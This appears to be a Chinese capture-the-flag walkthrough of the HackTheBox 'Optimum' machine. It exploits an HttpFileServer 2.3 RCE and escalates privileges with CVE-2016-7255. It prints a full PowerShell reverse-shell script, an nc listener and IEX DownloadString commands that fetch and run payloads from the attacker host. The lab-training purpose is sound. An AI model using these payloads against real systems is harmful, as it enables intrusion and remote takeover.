> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/sJ8SItYXqjXteYNadq1RNQ)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUuG0UiajA2P0yHw98oia20GcusAFnTvgxLygLm1uKlVs8SS6ibh6p74iaJsI52VicUbaDSnkRhjHZBn5CQ/640?wx_fmt=png)

靶机信息
----

靶机地址:

```
https://app.hackthebox.com/machines/Optimum
```

靶场: HackTheBox.com

靶机名称: Optimum

难度: 简单

提示信息:

```
无
```

目标: user.txt 和 root.txt

实验环境
----

```
攻击机:Kali 10.10.16.3

靶机:10.10.10.8
```

信息收集
----

### 扫描端口

扫描靶机开放的服务端口

```
sudo masscan -p1-65535 -e tun0  10.10.10.8
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUuG0UiajA2P0yHw98oia20GcuELJopVicDTcMUPjuDvzmp3IJQWKVcHAJtmPicdiat4SZk0bNPCDUAS3Gg/640?wx_fmt=png)

```
sudo nmap -sC -sV -p 80 10.10.10.8 -oN nmap.log
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUuG0UiajA2P0yHw98oia20Gcum1M6OaIP2gdx1TFHvry9ZYgo1s8uPYZpmQySQgWxBRzEibD8aelyyxw/640?wx_fmt=png)

从扫描结果中看到只开放了 80 端口，中间件为 HttpFileServer httpd 2.3。

Web 渗透
------

访问 80 端口

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUuG0UiajA2P0yHw98oia20GcuXkzgkA0WPTpgHPRticRwnbyoCLZfQnllraTvX8G4r4K6AcTvfHkYIUw/640?wx_fmt=png)

在页面左下角发现与 nmap 扫描结果相同的 HttpFileServer 2.3 程序版本，查找是否存地你们

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUuG0UiajA2P0yHw98oia20Gcu6jjfhUFUWkibHZbQzuMKicd7WpEy6jpKB5dyuKZDyJ3TAdUoCUVib415Q/640?wx_fmt=png)

发现 RCE（远程代码 / 命令执行）漏洞，

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUuG0UiajA2P0yHw98oia20Gcu1cjDTTcgRGNdicia0W5QzozGEoHTkT9mIgAbj6tBB1vQYYZSSeLUrWhw/640?wx_fmt=png)

exp 代码很简单，将其复制下来保存到 py 文件中并验证 exp

```
vim HttpFileServer-2.3-exp.py
```

反弹 shell 脚本 rev.ps1(这个脚本忘记在哪下载来的，直接上代码。注意最后一行修改为 IP 和端口)

```
function Invoke-PowerShellTcp

{

<#

.SYNOPSIS

Nishang script which can be used for Reverse or Bind interactive PowerShell from a target.



.DESCRIPTION

This script is able to connect to a standard netcat listening on a port when using the -Reverse switch.

Also, a standard netcat can connect to this script Bind to a specific port.



The script is derived from Powerfun written by Ben Turner & Dave Hardy



.PARAMETER IPAddress

The IP address to connect to when using the -Reverse switch.



.PARAMETER Port

The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.



.EXAMPLE

PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444



Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on

the given IP and port.



.EXAMPLE

PS > Invoke-PowerShellTcp -Bind -Port 80



Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port.



.EXAMPLE

PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444



Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be

listening on the given IP and port.



.LINK

http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html

https://github.com/nettitude/powershell/blob/master/powerfun.ps1

https://github.com/samratashok/nishang

#>      

  [CmdletBinding(DefaultParameterSet)] Param(



      [Parameter(Position = 0, Mandatory = $true, ParameterSet)]

      [Parameter(Position = 0, Mandatory = $false, ParameterSet)]

      [String]

       $IPAddress,



      [Parameter(Position = 1, Mandatory = $true, ParameterSet)]

      [Parameter(Position = 1, Mandatory = $true, ParameterSet)]

      [Int]

       $Port,



      [Parameter(ParameterSet)]

      [Switch]

       $Reverse,



      [Parameter(ParameterSet)]

      [Switch]

       $Bind



  )



   

  try

  {

       #Connect back if the reverse switch is used.

       if ($Reverse)

      {

           $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)

      }



       #Bind to the provided port if Bind switch is used.

       if ($Bind)

      {

           $listener = [System.Net.Sockets.TcpListener]$Port

           $listener.start()    

           $client = $listener.AcceptTcpClient()

      }



       $stream = $client.GetStream()

      [byte[]]$bytes = 0..65535|%{0}



       #Send back current username and computername

       $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")

       $stream.Write($sendbytes,0,$sendbytes.Length)



       #Show an interactive PowerShell prompt

       $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')

       $stream.Write($sendbytes,0,$sendbytes.Length)



       while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)

      {

           $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding

           $data = $EncodedText.GetString($bytes,0, $i)

          try

          {

               #Execute the command on the target.

               $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )

          }

          catch

          {

              Write-Warning "Something went wrong with execution of command on the target."

              Write-Error $_

          }

           $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '

           $x = ($error[0] | Out-String)

           $error.clear()

           $sendback2 = $sendback2 + $x



           #Return the results

           $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)

           $stream.Write($sendbyte,0,$sendbyte.Length)

           $stream.Flush()  

      }

       $client.Close()

       if ($listener)

      {

           $listener.Stop()

      }

  }

  catch

  {

      Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port."

      Write-Error $_

  }

}

Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.3 -Port 4444
```

攻击机上在反弹脚本目录下开启 HTTP 服务

```
py3 -m http.server
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUuG0UiajA2P0yHw98oia20GcueFfVmtI0ib19mmQ07noQfyMJibiahGJ032QBBca60IZlxfiazTibtWggmXA/640?wx_fmt=png)

攻击机监听 4444 端口

```
nc -lnvp 4444
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUuG0UiajA2P0yHw98oia20GcuQ2FBDp74eKDwCDUXAtGD0hgfWUr5NtiaEoMibhGibGTvb12saRaF1UbCQ/640?wx_fmt=png)

执行 exp 将 rev.ps1 上传到攻击机并加载

```
py3 HttpFileServer-2.3-exp.py 10.10.10.8 80 "c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.3:8000/rev.ps1')"
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUuG0UiajA2P0yHw98oia20Gcu6gxABsQBOSiafZ6nJEz9wibKSX6Z3cu32tp0taq0ia1bDVRPJvT8JaPbw/640?wx_fmt=png)

反弹成功，来找找敏感信息

```
ls
type user.txt.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUuG0UiajA2P0yHw98oia20GcuD7S5VP7iccIxb1RWwPWTJgIdbCLveLhLpCuiaqJxhAL5bia913crqjB9w/640?wx_fmt=png)

在当前用户桌面上发现 flag，继续搜集敏感信息

```
systeminfo
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUuG0UiajA2P0yHw98oia20GcuB0ibqibsdcbicth4rjdUxAN7sBpaX9RhcHU9Kbiaweia0Z5wVINr4Se6YeQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUuG0UiajA2P0yHw98oia20GcuiaC3r5MsX4j6Y4kpX6oaF02XIrEGrPibFSCIFx47ab204bWQiaXwxFO8A/640?wx_fmt=png)

发现靶机安装了 31 个补丁，到在线网站上对比下

```
https://i.hacking8.com/tiquan
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUuG0UiajA2P0yHw98oia20GcuFor9eYthkePOEhbMuWKliaQAiavWq0CXsjiaDl8dm66R4zNxzpTU8tEKQ/640?wx_fmt=png)

结果在网页下方显示

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUuG0UiajA2P0yHw98oia20GcudsbRDw5KNYD9RibibO25q6KdCyFZylcw1NiaIIfoOH8ygZmsJIvWZ1DlA/640?wx_fmt=png)

验证这个 exp

```
https://github.com/Ascotbe/Kernelhub/blob/master/CVE-2016-7255/CVE-2016-7255.ps1
```

```
IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.3:8000/CVE-2016-7255.ps1')
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUuG0UiajA2P0yHw98oia20GcuMd9ntg5J1v5vEj3zaj6iahAHH6uBu2OZZS2mrsqat2XticwHBHDNNjkw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUuG0UiajA2P0yHw98oia20GcuQkjN7DvuMaiayy6ticUWWxh2paxY6ZnMp9YHIRQCDiaiazw43q6rgIKibDA/640?wx_fmt=png)

运行结果，检查权限

```
whoami
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUuG0UiajA2P0yHw98oia20GcuqEJJZQRltqRxZSW7bk0sMam3P7hejWicaBUDribjP2CXgAmomUKiagAicA/640?wx_fmt=png)

提权成功，找找 flag

```
cd c:\users\administrator\desktop
type root.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUuG0UiajA2P0yHw98oia20GcuA1JXbNbUWla1jnXRXhukl5n4HHFJSq43EI6jlmFDBh4uSOfj2MQPicg/640?wx_fmt=png)

拿到 root.txt，游戏结束

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUuG0UiajA2P0yHw98oia20GculCjAvGZKgbKH5EXvukJf4um9Ag1n81qTlx1iaicthWsBE89VHM5ic6euA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUuG0UiajA2P0yHw98oia20GcuGeIEnRfaIXnvr5mRgAliaEGopGdvHACVwFrfSNFC8HcaW0sVbFvOYJg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/7gUQD4TbLUuG0UiajA2P0yHw98oia20GcuV1thoUKVibNFFjPBABwiby7tFDFAsVIQDUFr2oUtKSH5ckrXmdKuYMzw/640?wx_fmt=jpeg)